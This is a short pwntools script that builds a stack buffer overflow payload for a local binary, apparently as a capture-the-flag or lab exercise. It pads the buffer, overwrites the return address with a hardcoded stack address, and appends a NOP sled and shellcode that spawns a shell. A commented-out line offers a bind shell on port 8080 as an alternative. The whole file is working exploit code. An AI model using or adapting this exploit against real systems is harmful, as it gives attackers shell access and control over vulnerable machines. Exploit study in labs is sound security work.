from pwn import *

OFFSET = 18;

context.binary = "./a.out"
context.log_level = "debug"

return_address = p64(0x7fffffffe2f6 + OFFSET + 8 + 4 * 8)

payload = OFFSET * b'A' + return_address

# Nop Sled
sc = shellcraft.amd64.nop() * 128

# Shellcode
# sc += shellcraft.amd64.linux.bindsh(8080, "ipv4")
sc += shellcraft.sh()
sc += shellcraft.amd64.linux.exit();

payload += asm(sc)

with open("payload.bin", "wb") as f:
    f.write(payload)
